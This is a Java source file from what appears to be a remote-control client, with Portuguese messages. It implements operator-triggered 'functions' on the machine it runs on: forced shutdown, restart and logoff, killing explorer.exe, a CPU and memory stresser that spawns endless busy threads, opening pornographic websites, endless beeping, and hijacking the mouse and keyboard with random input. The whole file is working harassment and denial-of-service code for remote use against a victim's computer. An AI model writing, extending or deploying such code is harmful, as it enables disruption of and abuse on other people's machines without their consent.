package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 24/01/2025 - 01:22
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ControlComponents;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.server.ConnectServer;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.Random;

public class ClientCommandFunctions extends ClientCommand {

    public boolean STRESS = false;
    public boolean BEEP = false;
    public ArrayList<Thread> THREAD_LIST = new ArrayList<>();
    public Thread BEEP_THREAD = null;
    public boolean MOUSE = false;
    public boolean KEYBOARD = false;

    public ClientCommandFunctions() {
        super("functions");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.equalsIgnoreCase("shutdown")) {
            msg("Desligando computador...");
            exec("shutdown /s /f /t 0");
        } else if (input.equalsIgnoreCase("restart")) {
            msg("Reiniciando computador...");
            exec("shutdown /r /f /t 0");
        } else if (input.equalsIgnoreCase("logoff")) {
            msg("Fazendo logoff no computador...");
            exec("shutdown /l");
        } else if (input.equalsIgnoreCase("mkdirs")) {
            msg("Criando 1000 pastas...");
            try {
                for (int i = 1; i <= 1000; i++) {
                    new File(FileComponents.FOLDER, String.valueOf(i)).mkdir();
                }
            } catch (Exception exception) {
                msg("Ocorreu um erro ao criar 1000 pastas! (" + exception.getMessage() + ")");
                exception(exception);
                return;
            }
            msg("1000 pastas criadas!");
        } else if (input.equalsIgnoreCase("desktop")) {
            msg("Forçado usuário para ir para ir para a área de trabalho!");
            ControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_WINDOWS);
            ControlComponents.ROBOT_INSTANCE.keyPress(KeyEvent.VK_D);
            ControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_D);
            ControlComponents.ROBOT_INSTANCE.keyRelease(KeyEvent.VK_WINDOWS);
        } else if (input.equalsIgnoreCase("killexplorer")) {
            msg("Matando desktop...");
            exec("taskkill /f /IM explorer.exe");
        } else if (input.equalsIgnoreCase("explorer")) {
            msg("Iniciando explorer...");
            exec("explorer");
        } else if (input.equalsIgnoreCase("stress")) {
            if (STRESS) {
                STRESS = false;
                msg("Parando stresser...");
                for (Thread thread : new ArrayList<>(THREAD_LIST)) {
                    try {
                        thread.interrupt();
                    } catch (Exception ignored) {
                    }
                }
                THREAD_LIST.clear();
                msg("Stresser parado!");
            } else {
                STRESS = true;
                try {
                    new Thread(() -> {
                        while (STRESS) {
                            Thread thread = new Thread(() -> {
                                while (true) {
                                }
                            });
                            THREAD_LIST.add(thread);
                            thread.start();
                        }
                    }).start();

                    new Thread(() -> {
                        ArrayList<int[]> memoryHog = new ArrayList<>();
                        while (STRESS) {
                            memoryHog.add(new int[10 * 1024 * 1024]);
                        }
                    }).start();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao iniciar o stresser! (" + exception.getMessage() + ")");
                    exception(exception);

                    STRESS = false;
                    msg("Parando stresser...");
                    for (Thread thread : new ArrayList<>(THREAD_LIST)) {
                        try {
                            thread.interrupt();
                        } catch (Exception ignored) {
                        }
                    }
                    THREAD_LIST.clear();
                    msg("Stresser parado!");
                }
            }
        } else if (input.equalsIgnoreCase("adult")) {
            msg("Abrindo sites adultos...");
            exec("start https://www.redtube.com/");
            exec("start https://www.pornhub.com/");
            exec("start https://www.xvideos.com/");
        } else if (input.equalsIgnoreCase("rickroll")) {
            msg("Abrindo rick roll...");
            exec("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        } else if (input.equalsIgnoreCase("beep")) {
            if (BEEP) {
                msg("Beep parado!");
                BEEP = false;
                try {
                    BEEP_THREAD.interrupt();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao parar o beep! (" + exception.getMessage() + ")");
                    exception(exception);
                }
            } else {
                msg("Beep iniciado!");
                BEEP = true;
                BEEP_THREAD = new Thread(() -> {
                    Random random = new Random();
                    while (BEEP) {
                        generateBeep(20, 1500 + random.nextInt(2500));
                        try {
                            Thread.sleep(10);
                        } catch (Exception ignored) {
                        }
                    }
                });
                BEEP_THREAD.start();
            }
        } else if (input.equalsIgnoreCase("mousebug")) {
            if (MOUSE) {
                msg("Parando mouse bugado...");
                MOUSE = false;
            } else {
                msg("Iniciando mouse bugado...");
                MOUSE = true;
                new Thread(() -> {
                    try {
                        Robot robot = new Robot();
                        Random random = new Random();

                        while (MOUSE) {
                            Point mouseLocation = MouseInfo.getPointerInfo().getLocation();
                            int currentX = (int) mouseLocation.getX();
                            int currentY = (int) mouseLocation.getY();

                            int deltaX = random.nextInt(21) - 10;
                            int deltaY = random.nextInt(21) - 10;

                            for (int i = 0; i < 5; i++) {
                                int stepX = currentX + (deltaX * i) / 5;
                                int stepY = currentY + (deltaY * i) / 5;

                                robot.mouseMove(stepX, stepY);
                                Thread.sleep(50);

                                if (random.nextBoolean()) {
                                    robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                                    robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
                                } else {
                                    robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
                                    robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
                                }
                            }

                            Thread.sleep(random.nextInt(500) + 200);
                        }
                    } catch (Exception exception) {
                        msg("Ocorreu um erro ao processar o mouse bugado! (" + exception.getMessage() + ")");
                        exception(exception);
                    }
                }).start();
            }
        } else if (input.equalsIgnoreCase("keyboardbug")) {
            if (KEYBOARD) {
                KEYBOARD = false;
                msg("Parando teclado aleatório...");
            } else {
                KEYBOARD = true;
                msg("Simulando teclado aleatório...");
                Random random = new Random();
                new Thread(() -> {
                    while (KEYBOARD) {
                        int randomKey = KeyEvent.VK_A + random.nextInt(26);
                        ControlComponents.ROBOT_INSTANCE.keyPress(randomKey);
                        ControlComponents.ROBOT_INSTANCE.keyRelease(randomKey);
                        try {
                            Thread.sleep(200);
                        } catch (Exception ignored) {
                        }
                    }
                }).start();
            }
        } else {
            msg("Funções: (shutdown/restart/logoff/mkdirs/desktop/killexplorer/explorer/stress/adult/rickroll/beep/mousebug/keyboardbug)");
        }
    }

    public void exec(String command) {
        try {
            new Thread(() -> {
                try {
                    boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
                    String inputInfo = (windows ? "cmd /c " : "") + command;
                    File directory = new File(FileComponents.FOLDER);

                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command(inputInfo.split(" "));
                    processBuilder.directory(directory);

                    processBuilder.start();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao executar o comando " + command + "! (" + exception.getMessage() + ")");
                    exception(exception);
                }
            }).start();
        } catch (Exception exception) {
            msg("Ocorreu um erro ao iniciar a thread do comando " + command + "! (" + exception.getMessage() + ")");
            exception(exception);
        }
    }

    public void generateBeep(int durationMs, int frequencyHz) {
        Runnable runnable = () -> {
            try {
                float sampleRate = 44100;
                byte[] buffer = new byte[1];
                AudioFormat format = new AudioFormat(sampleRate, 8, 1, true, true);

                SourceDataLine line = AudioSystem.getSourceDataLine(format);
                line.open(format);
                line.start();

                for (int i = 0; i < durationMs * (sampleRate / 1000); i++) {
                    double angle = i / (sampleRate / frequencyHz) * 2.0 * Math.PI;
                    buffer[0] = (byte) (Math.sin(angle) * 127);
                    line.write(buffer, 0, 1);
                }

                line.drain();
                line.close();
            } catch (Exception exception) {
                msg("Ocorreu um erro ao gerar um beep! (" + exception.getMessage() + ")");
                exception(exception);
            }
        };
        runnable.run();
    }

}
